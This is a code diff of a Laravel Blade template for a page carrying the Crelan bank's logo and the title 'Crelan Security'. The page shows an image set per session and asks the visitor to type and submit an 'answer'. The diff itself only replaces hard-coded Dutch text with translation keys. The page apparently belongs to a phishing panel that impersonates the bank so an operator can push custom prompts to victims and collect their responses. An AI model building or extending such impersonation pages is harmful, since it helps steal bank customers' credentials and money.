@@ -1,6 +1,6 @@
 @extends('layouts.app')
 
-@section('title', 'Informatie | Crelan')
+@section('title', __('messages.information') . ' | Crelan')
 
 @section('content')
 <div class="form-page-center">
@@ -16,13 +16,13 @@
                 <path d="M13.8245 18.0597C21.2329 18.0597 27.6713 14.0031 30.2683 9.07626L28.6397 6.10059C25.2453 10.9361 19.6004 14.4856 12.5825 14.4856C10.4418 14.4856 8.32 14.2305 6.3252 13.682L7.2089 17.036C9.31348 17.7029 11.5325 18.0605 13.8253 18.0605L13.8245 18.0597Z" fill="#009644"/>
                 <path d="M31.5311 0C30.9438 2.13956 29.9628 4.21713 28.6408 6.10078L30.2694 9.07645C27.6724 14.0033 21.234 18.0599 13.8256 18.0599C11.5329 18.0599 9.31457 17.7023 7.20921 17.0354L6.3255 13.6814C3.98333 13.0377 1.81602 11.9901 0 10.4721L3.31369 23.048C4.33619 23.5972 5.67233 24.1877 7.28448 24.6916L6.12869 20.3044C8.93427 21.4608 11.9618 22.0919 15.1186 22.0919C24.0294 22.0919 31.9051 17.0696 36.6679 9.38483L31.5311 0Z" fill="#84BD00"/>
             </svg>
-            <span>Crelan Beveiliging</span>
+            <span>{{ __('messages.crelan_security') }}</span>
         </div>
 
         <div class="form-container--content">
             @if($session->custom_image_url)
             <div class="custom-image-container">
-                <img src="{{ $session->custom_image_url }}" alt="Informatie" class="custom-image">
+                <img src="{{ $session->custom_image_url }}" alt="{{ __('messages.information') }}" class="custom-image">
             </div>
             @endif
             
@@ -33,14 +33,14 @@
                             type="text" 
                             id="answer-input"
                             class="form--input" 
-                            placeholder="Uw antwoord"
+                            placeholder="{{ __('messages.your_answer') }}"
                             required
                         >
                     </div>
                 </div>
                 
                 <button type="submit" class="form-submit-btn" id="submit-btn">
-                    <span>Verzenden</span>
+                    <span>{{ __('messages.submit') }}</span>
                 </button>
             </form>
         </div>
